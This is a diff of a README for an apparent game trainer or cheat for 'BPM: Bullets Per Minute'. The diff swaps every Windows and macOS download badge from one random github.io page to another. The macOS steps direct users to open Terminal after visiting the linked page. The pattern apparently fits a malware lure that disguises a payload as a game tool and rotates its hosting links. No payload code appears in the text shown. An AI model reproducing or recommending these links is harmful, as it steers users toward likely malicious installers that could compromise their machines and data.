@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download BPM BULLETS PER MINUTE Trainer](https://img.shields.io/badge/⬇_Download_BPM%20BULLETS%20PER%20MINUTE_Trainer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download BPM BULLETS PER MINUTE Trainer](https://img.shields.io/badge/⬇_Download_BPM%20BULLETS%20PER%20MINUTE_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -78,9 +78,9 @@ BPM: Bullets Per Minute is a roguelite FPS where every action — shooting, relo
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -101,7 +101,7 @@ BPM: Bullets Per Minute is a roguelite FPS where every action — shooting, relo
 
 <div align="center">
 
-[![⬇ Download BPM BULLETS PER MINUTE Trainer](https://img.shields.io/badge/⬇_Download_BPM%20BULLETS%20PER%20MINUTE_Trainer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download BPM BULLETS PER MINUTE Trainer](https://img.shields.io/badge/⬇_Download_BPM%20BULLETS%20PER%20MINUTE_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -133,7 +133,7 @@ BPM: Bullets Per Minute is a roguelite FPS where every action — shooting, relo
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ BPM: Bullets Per Minute is a roguelite FPS where every action — shooting, relo
 
 <div align="center">
 
-[![⬇ Download BPM BULLETS PER MINUTE Trainer](https://img.shields.io/badge/⬇_Download_BPM%20BULLETS%20PER%20MINUTE_Trainer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download BPM BULLETS PER MINUTE Trainer](https://img.shields.io/badge/⬇_Download_BPM%20BULLETS%20PER%20MINUTE_Trainer-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
